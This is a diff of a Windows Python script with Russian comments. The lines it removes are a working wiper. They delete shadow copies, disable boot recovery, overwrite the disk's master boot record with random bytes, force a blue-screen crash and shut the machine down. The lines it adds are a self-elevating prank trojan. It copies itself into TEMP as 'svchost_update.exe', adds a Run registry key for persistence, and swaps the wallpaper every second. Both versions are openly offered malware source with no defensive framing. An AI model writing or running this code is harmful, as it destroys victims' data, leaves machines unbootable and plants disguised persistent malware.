@@ -3,12 +3,11 @@ import sys
 import time
 import ctypes
 import random
-import threading
-import subprocess
-import tkinter as tk
+import urllib.request
+import winreg
 
 # ==========================================
-# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И СНОС MBR
+# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И УСТАНОВКА
 # ==========================================
 
 def is_admin():
@@ -22,91 +21,47 @@ def run_as_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         sys.exit()
 
-def destroy_mbr():
-    # Отключаем восстановление и теневые копии
-    subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+# ==========================================
+# ЧАСТЬ 2: АВТОЗАГРУЗКА (PERSISTENCE)
+# ==========================================
 
-    # Код на C# для перезаписи MBR
-    mbr_code = """
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-public class MBR {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-    public static void Destroy() {
-        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
-        if (hDevice == IntPtr.Zero) return;
-        byte[] garbage = new byte[512];
-        new Random().NextBytes(garbage);
-        uint bytesWritten;
-        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
-        CloseHandle(hDevice);
-    }
-}
-"""
+def establish_persistence():
     try:
-        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
-        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Копируемся в папку Temp
+        temp_dir = os.getenv("TEMP")
+        new_path = os.path.join(temp_dir, "svchost_update.exe")
+        if sys.executable != new_path:
+            import shutil
+            shutil.copy2(sys.executable, new_path)
+            
+        # Прописываем в реестр
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WallpaperTroll", 0, winreg.REG_SZ, new_path)
+        winreg.CloseKey(key)
     except:
         pass
 
 # ==========================================
-# ЧАСТЬ 2: ЯДОВИТЫЙ ВИЗУАЛ (GDI-АТАКА)
+# ЧАСТЬ 3: СМЕНА ОБОЕВ (ТРОЛЛИНГ)
 # ==========================================
 
-def visual_chaos():
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.configure(bg="black")
-    root.overrideredirect(True)
-
-    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
-    canvas.pack()
-
-    colors = ["#00FF00", "#FF00FF", "#00FFFF", "#FFFF00", "#FF0000", "#0000FF"]
-
-    def draw_shit():
-        while True:
-            try:
-                # Рисуем случайные круги и линии кислотными цветами
-                x = random.randint(0, root.winfo_screenwidth())
-                y = random.randint(0, root.winfo_screenheight())
-                r = random.randint(50, 400)
-                color = random.choice(colors)
-                
-                # Круг
-                canvas.create_oval(x-r, y-r, x+r, y+r, outline=color, width=random.randint(2, 10))
-                # Линия
-                canvas.create_line(x, y, random.randint(0, 1920), random.randint(0, 1080), fill=color, width=random.randint(1, 5))
-                
-                root.update()
-            except:
-                break
-
-    # Запускаем рисование в отдельном потоке
-    threading.Thread(target=draw_shit, daemon=True).start()
+def change_wallpaper():
+    # Список случайных картинок (или можно генерировать локально)
+    # Используем сервис picsum.photos для случайных картинок
+    url = "https://picsum.photos/1920/1080?random=" + str(random.randint(1, 10000))
+    wallpaper_path = os.getenv("TEMP") + "\\wallpaper.jpg"
     
-    root.after(15000, root.destroy) # Через 15 секунд закроется
-    root.mainloop()
+    try:
+        # Скачиваем картинку
+        urllib.request.urlretrieve(url, wallpaper_path)
+        
+        # Меняем обои через системный API
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
+    except:
+        pass
 
 # ==========================================
-# ЧАСТЬ 3: BSOD И ВЫКЛЮЧЕНИЕ
-# ==========================================
-
-def trigger_bsod():
-    bsod_cmd = 'powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class BSOD { [DllImport(\\"ntdll.dll\\")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue); [DllImport(\\"ntdll.dll\\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); }\'; $pv = $false; [BSOD]::RtlAdjustPrivilege(19, $true, $false, [ref]$pv); $resp = 0; [BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$resp)"'
-    subprocess.run(bsod_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-# ==========================================
-# ГЛАВНЫЙ ЦИКЛ
+# ЧАСТЬ 4: ГЛАВНЫЙ ЦИКЛ
 # ==========================================
 
 def main():
@@ -114,16 +69,16 @@ def main():
         run_as_admin()
         return
 
-    # Запускаем снос MBR в фоне
-    threading.Thread(target=destroy_mbr, daemon=True).start()
+    # Устанавливаем автозагрузку
+    establish_persistence()
 
-    # Запускаем визуал на 15 секунд
-    visual_chaos()
-
-    # Вызываем BSOD и выключаем
-    trigger_bsod()
-    time.sleep(2)
-    os.system("shutdown /s /f /t 0")
+    # Бесконечный цикл смены обоев
+    while True:
+        try:
+            change_wallpaper()
+            time.sleep(1) # Меняем каждую секунду
+        except:
+            pass
 
 if __name__ == "__main__":
     main()
